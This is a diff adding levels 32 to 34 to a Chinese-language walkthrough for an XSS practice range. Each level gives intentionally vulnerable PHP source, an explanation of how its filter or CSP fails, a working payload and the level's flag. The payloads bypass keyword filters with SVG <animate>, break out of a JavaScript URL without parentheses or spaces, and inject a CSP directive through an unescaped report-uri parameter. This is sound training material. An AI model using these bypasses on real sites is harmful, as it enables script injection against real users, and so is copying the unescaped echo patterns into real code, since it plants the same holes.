@@ -3,7 +3,6 @@
 本靶场包含 20 个不同类型的 XSS 关卡。以下是每一关的源码分析及通关思路。
 
 ---
-
 ## Level 1: Reflected XSS (Basic)
 
 **源码分析：**
@@ -840,5 +839,165 @@ document.addEventListener('DOMContentLoaded', function () {
 2. Angular 1.4.4 编译该元素的 `ng-focus` 指令，表达式就绪
 3. 页面加载后外部脚本聚焦 `id=x`，触发 `ng-focus`
 4. 表达式通过 `composedPath()` 与 `orderBy` 在到达 `window` 时调用 `z(document.cookie)`，弹出 Cookie
+
+---
+
+## Level 32: Reflected XSS (href/events blocked)
+
+**源码分析：**
+- 页面入口与模板：[level32/index.php](file:///d:/Book/XSS-Sec/level32/index.php)
+  - 设置 Flag Cookie：
+```php
+setcookie("flag", "flag{c2f1e3b6-32f0-4f3f-9a7b-7b6c32a4f932}", time() + 3600, "/", "", false, false);
+```
+  - 读取输入与 WAF 检测：
+```php
+$search = isset($_GET['search']) ? $_GET['search'] : '';
+if ($search) {
+    $s = strtolower($search);
+    if (preg_match('/\bon\w+\s*=/i', $s)) {
+        http_response_code(400);
+        die('Blocked: event handlers not allowed');
+    }
+    if (preg_match('/\bhref\s*=/i', $s)) {
+        http_response_code(400);
+        die('Blocked: href attribute not allowed');
+    }
+}
+```
+  - 反射点（未进行 HTML 转义，直接输出到页面）：
+```php
+<div class="message">
+  <div id="content"><?php echo $search; ?></div>
+</div>
+```
+- 关键漏洞点：
+  - WAF 使用的是基于输入字符串的浅层匹配：
+    - `on\w+=` 拦截内联事件属性（如 `onclick=`）
+    - `href=` 拦截显式的 `href` 赋值
+  - 但**不会识别 SVG/SMIL 的“动态属性赋值”语义**，例如 `<animate>` 的 `attributeName` 与 `values` 在渲染期为目标元素设置属性值，从而绕过对输入中“直接出现的 href=”的检测
+
+**通关思路：**
+- 构造 SVG 结构，使用 `<animate>` 在渲染阶段为 `<a>` 动态设置 `href`：
+  - `<a>` 起初不包含 `href=`（因此 WAF 不命中）
+  - `<animate attributeName=href values=javascript:alert(1)>` 在解析/动画阶段将 `href` 写入为 `javascript:alert(1)`
+  - 用户点击 `<text>` 触发链接，执行 `javascript:` 代码
+
+**Payload：**
+```html
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
+```
+
+**执行流程：**
+1. 服务端检查输入字符串，不含 `on...=` 与 `href=`，WAF放行
+2. 页面直接反射输入到 DOM，浏览器解析为 SVG
+3. `<animate>` 在渲染阶段将 `<a>` 的 `href` 动态赋值为 `javascript:alert(1)`
+4. 用户点击“Click me”，浏览器以 `javascript:` 伪协议执行，触发 `alert(1)`
+
+**Flag：**
+```
+flag{c2f1e3b6-32f0-4f3f-9a7b-7b6c32a4f932}
+```
+
+---
+## Level 33: JS URL XSS (chars blocked)
+
+**源码分析：**
+- 页面注入点在 `href="javascript:..."` 的 JavaScript URL 中，用户输入被直接拼接到 fetch 的 body 参数：[level33/index.php](file:///d:/Book/XSS-Sec/level33/index.php#L25-L33)
+```html
+<a class="is-linkback" href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&<?php echo $q; ?>'}).finally(_=>window.location='/')">Back to Blog</a>
+```
+- 输入参数与字符限制（WAF）：禁止空白字符与圆括号，使用浅层正则匹配判断是否阻断：[level33/index.php](file:///d:/Book/XSS-Sec/level33/index.php#L3-L12)
+```php
+$q = isset($_GET['q']) ? $_GET['q'] : '';
+$blocked = false;
+if ($q !== '') {
+    if (preg_match('/[\s]/', $q)) $blocked = true;
+    if (preg_match('/[()]/', $q)) $blocked = true;
+}
+```
+- 正常输入示例（未触发阻断时的渲染）：[level33/index.php](file:///d:/Book/XSS-Sec/level33/index.php#L35-L37)
+```html
+<a class="is-linkback" href="javascript:fetch('/analytics',{method:'post',body:'/post?postId=5&666'}).finally(_=>window.location='/')">Back to Blog</a>
+```
+
+**通关思路：**
+- 目标是在 JavaScript URL 的上下文中执行任意代码，同时满足以下限制：
+  - 不能使用空格（以 `/**/` 注释替代空格）
+  - 不能使用圆括号（使用隐式类型转换触发执行）
+- 利用链路：
+  - `'},`: 闭合前面的字符串 `'` 和对象 `}`。使用逗号 , 告诉 JS 引擎：后面还有其他的表达式需要计算
+  - `x=x=>{throw/**/onerror=alert,666}`: 定义一个恶意函数 x。该函数会将全局错误处理函数 onerror 改为 alert，然后抛出异常
+  - `toString=x, window+''`: 将 window.toString 指向恶意函数。当 window + '' 发生时，JS 会自动调用 toString 进行类型转换，从而执行函数
+  - `,{x:'`: 开启一个新的对象，并留下一个未闭合的单引号，用来吞掉原代码中剩下的 `'}).finally(...)`，保证整段 JS 语法合法
+
+**Payload：**
+```
+'},x=x=>{throw/**/onerror=alert,666},toString=x,window+'',{x:'
+```
+
+**执行流程：**
+1. 用户输入被直接拼接到 JavaScript URL 的字符串中，未进行转义
+2. 通过 `'} , ...` 闭合原有字符串与对象字面量，切入顶层语句
+3. 箭头函数中执行 `throw/**/onerror=alert,666`：
+   - 将 `alert` 绑定到异常处理器 `onerror`
+   - 抛出异常 `666`，触发 `onerror(alert)` 执行
+4. 通过 `toString=x` 与 `window+''` 在不使用圆括号的情况下调用该函数
+5. 最终弹窗成功
+
+**Flag：**
+```
+flag{33-js-url-throw-onerror}
+```
+
+---
+
+## Level 34: CSP Bypass (report-uri token)
+
+**源码分析：**
+- CSP 由服务端设置，并将 `token` 参数拼接进 `report-uri` 指令：[level34/index.php](file:///d:/Book/XSS-Sec/level34/index.php#L1-L8)
+```php
+$search = isset($_GET['search']) ? $_GET['search'] : '';
+$token = isset($_GET['token']) ? $_GET['token'] : '';
+header("Content-Security-Policy: default-src 'self'; script-src 'self'; report-uri /csp-report?token=" . $token);
+```
+- 反射点：`search` 未转义直接输出到页面（用于观察脚本是否执行）：[level34/index.php](file:///d:/Book/XSS-Sec/level34/index.php#L20-L27)
+```php
+<div class="message">
+  <div id="content"><?php echo $search; ?></div>
+</div>
+```
+- 初始策略：`script-src 'self'` 禁止内联脚本，导致 `<script>alert(666)</script>` 不执行
+- 关键缺陷：`token` 未经任何过滤或编码，作为 `report-uri` 的参数拼接到 CSP 中，允许注入分号与新的 CSP 指令
+
+**通关思路（Chrome 特性）：**
+- 在 Chrome 中，`report-uri` 的值如果包含分号，分号后的内容会被解析为新的 CSP 指令
+- 构造 `token` 令其注入 `script-src-elem 'unsafe-inline'`，使内联 `<script>` 生效
+- 将脚本作为 `search` 反射到页面
+
+**Payload 组合：**
+- `search`：
+```
+%3Cscript%3Ealert%28666%29%3C%2Fscript%3E
+```
+- `token`：
+```
+;script-src-elem 'unsafe-inline'
+```
+- 访问示例：
+```
+/level34/index.php?search=%3Cscript%3Ealert%28666%29%3C%2Fscript%3E&token=;script-src-elem%20%27unsafe-inline%27
+```
+
+**执行流程：**
+1. 服务端返回 CSP：`default-src 'self'; script-src 'self'; report-uri /csp-report?token=<你的 token>`
+2. 由于 `token` 包含分号，Chrome 将分号后的内容解析为独立 CSP 指令
+3. 注入的 `script-src-elem 'unsafe-inline'` 生效，允许内联 `<script>` 标签执行
+4. 页面中的反射脚本 `<script>alert(666)</script>` 被执行
+
+**Flag：**
+```
+flag{34-csp-report-uri-token}
+```
 
 ---
